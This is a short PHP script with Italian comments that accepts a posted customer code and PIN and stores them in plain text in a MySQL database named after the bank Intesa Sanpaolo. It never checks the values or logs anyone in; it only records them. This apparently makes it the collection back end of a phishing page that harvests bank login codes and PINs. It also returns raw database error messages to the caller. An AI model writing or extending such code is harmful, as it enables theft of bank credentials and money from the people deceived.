<?php
header('Content-Type: application/json');

// Ricevi i dati JSON
$data = json_decode(file_get_contents('php://input'), true);

// Verifica che i dati siano presenti
if (!isset($data['codice']) || !isset($data['pin'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Dati mancanti']);
    exit;
}

// Pulisci i dati in input
$codice = filter_var($data['codice'], FILTER_SANITIZE_STRING);
$pin = filter_var($data['pin'], FILTER_SANITIZE_STRING);

// Configurazione database MySQL per XAMPP
$host = 'localhost';
$dbname = 'intesasanpaolo'; // Assicurati che questo sia il nome del tuo database
$username = 'root';
$password = ''; // La password di default per XAMPP è vuota



try {
    // Connessione al database
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Prepara e esegui la query per la tabella 'users'
    $stmt = $conn->prepare("INSERT INTO users (codice, pin) VALUES (:codice, :pin)");
    $stmt->bindParam(':codice', $codice);
    $stmt->bindParam(':pin', $pin);
    $stmt->execute();
    
    echo json_encode(['success' => true]);

} catch(PDOException $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Errore database: ' . $e->getMessage()]);
    error_log("Errore Database: " . $e->getMessage());
} 